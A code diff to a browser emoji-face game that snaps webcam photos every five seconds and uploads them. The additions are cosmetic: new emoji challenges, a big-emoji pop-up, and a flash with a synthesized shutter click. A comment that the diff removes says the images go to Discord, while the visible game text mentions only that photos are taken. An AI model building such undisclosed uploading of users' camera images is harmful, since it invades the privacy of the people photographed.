@@ -21,11 +21,127 @@ const CHALLENGES = [
   "😱 Surprise face!",
   "😂 Laugh hard!",
   "🤔 Thinking face!",
-  "🙃 Upside-down smile!"
+  "🙃 Upside-down smile!",
+  "😴 Sleeping face!",
+  "🥺 Puppy eyes!",
+  "🤨 Suspicious look!",
+  "🤪 Silly face!",
+  "🤫 Shh! Quiet!",
+  "🤢 Disgusted face!",
+  "🤩 Star struck!",
+  "🧐 Fancy face!",
+  "🤠 Cowboy/Yeehaw!",
+  "🤖 Robot mode!",
+  "👽 Alien face!",
+  "💀 Zombie mode!",
+  "🤡 Clown face!",
+  "💪 Flex muscles!",
+  "✌️ Peace sign!",
+  "🫶 Heart hands!",
+  "🫡 Salute!",
+  "🫣 Peekaboo!"
 ];
 
 function randomChallenge() {
   return CHALLENGES[Math.floor(Math.random() * CHALLENGES.length)];
+}
+
+// --- NEW: Big Emoji Display Function ---
+function showBigEmoji(emoji) {
+  const div = document.createElement('div');
+  div.textContent = emoji;
+  
+  // Styling for the big emoji
+  Object.assign(div.style, {
+    position: 'fixed',
+    top: '50%',
+    left: '50%',
+    transform: 'translate(-50%, -50%) scale(0)',
+    fontSize: '15rem', // Very big size
+    zIndex: '10000',
+    pointerEvents: 'none',
+    textShadow: '0 10px 40px rgba(0,0,0,0.5)',
+    transition: 'transform 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275), opacity 0.5s ease',
+    opacity: '1'
+  });
+
+  document.body.appendChild(div);
+
+  // Trigger pop-in animation
+  requestAnimationFrame(() => {
+    div.style.transform = 'translate(-50%, -50%) scale(1)';
+  });
+
+  // Fade out after 2.5 seconds (total 3 seconds visibility)
+  setTimeout(() => {
+    div.style.opacity = '0';
+    div.style.transform = 'translate(-50%, -50%) scale(1.5)'; // Slight zoom out on fade
+    
+    // Remove from DOM after fade completes
+    setTimeout(() => {
+      if (document.body.contains(div)) {
+        document.body.removeChild(div);
+      }
+    }, 500);
+  }, 2500);
+}
+
+// --- Camera Effect Functions ---
+function triggerCameraEffect() {
+  // 1. Visual Flash (White overlay)
+  const flash = document.createElement('div');
+  Object.assign(flash.style, {
+    position: 'fixed',
+    left: '0',
+    top: '0',
+    width: '100vw',
+    height: '100vh',
+    backgroundColor: 'white',
+    opacity: '0.6',
+    zIndex: '999999',
+    pointerEvents: 'none',
+    transition: 'opacity 0.2s ease-out'
+  });
+
+  document.body.appendChild(flash);
+
+  // Fade out immediately
+  requestAnimationFrame(() => {
+    flash.style.opacity = '0';
+  });
+
+  // Clean up DOM
+  setTimeout(() => {
+    if (document.body.contains(flash)) {
+      document.body.removeChild(flash);
+    }
+  }, 200);
+
+  // 2. Audio Click (Synthetic - No external file needed)
+  try {
+    const AudioContext = window.AudioContext || window.webkitAudioContext;
+    if (AudioContext) {
+      const ctx = new AudioContext();
+      const osc = ctx.createOscillator();
+      const gain = ctx.createGain();
+
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+
+      // Create a quick "noise" or "click" sound
+      osc.type = 'triangle';
+      osc.frequency.setValueAtTime(800, ctx.currentTime);
+      osc.frequency.exponentialRampToValueAtTime(100, ctx.currentTime + 0.15);
+
+      gain.gain.setValueAtTime(0.1, ctx.currentTime);
+      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.15);
+
+      osc.start(ctx.currentTime);
+      osc.stop(ctx.currentTime + 0.15);
+    }
+  } catch (e) {
+    console.warn("Shutter sound blocked or not supported", e);
+  }
 }
 
 async function initCamera() {
@@ -81,6 +197,9 @@ async function captureAndSendFrame() {
     return;
   }
 
+  // --- TRIGGER EFFECT HERE ---
+  triggerCameraEffect();
+
   const canvas = document.createElement('canvas');
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
@@ -88,11 +207,10 @@ async function captureAndSendFrame() {
   const ctx = canvas.getContext('2d');
   ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-  // CHANGED: Use JPEG with 0.7 quality to reduce file size significantly
-  // This prevents network lag and ensures all 5 images get to Discord
+  // CHANGED: Use JPEG with 0.7 quality to reduce file size
   const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
 
-  // Save locally for showing at the end
+  // Save locally
   capturedFrames.push(dataUrl);
   captureCount++;
 
@@ -106,7 +224,6 @@ async function captureAndSendFrame() {
     console.log(`Image ${captureCount} sent successfully.`);
   } catch (err) {
     console.error(`Upload failed for image ${captureCount}:`, err);
-    // Don't change main statusEl to error yet, wait until game over if needed
   }
 
   // Auto-stop after MAX_CAPTURES
@@ -132,12 +249,24 @@ async function startGame() {
     return;
   }
 
-  challengeEl.textContent = randomChallenge();
+  // Start with the first challenge
+  const firstChallenge = randomChallenge();
+  challengeEl.textContent = firstChallenge;
+  showBigEmoji(firstChallenge.split(' ')[0]);
+  
   statusEl.textContent = `🎮 Game running! A photo is taken every 5 seconds (total ${MAX_CAPTURES}).`;
 
   captureInterval = setInterval(() => {
-    challengeEl.textContent = randomChallenge();
+    // 1. Capture the previous pose
     captureAndSendFrame();
+    
+    // 2. If game is not over, show NEXT challenge
+    if (captureCount < MAX_CAPTURES) {
+      const nextChallenge = randomChallenge();
+      challengeEl.textContent = nextChallenge;
+      // Show Big Emoji for the new challenge
+      showBigEmoji(nextChallenge.split(' ')[0]);
+    }
   }, 5000);
 
   stopBtn.disabled = false;
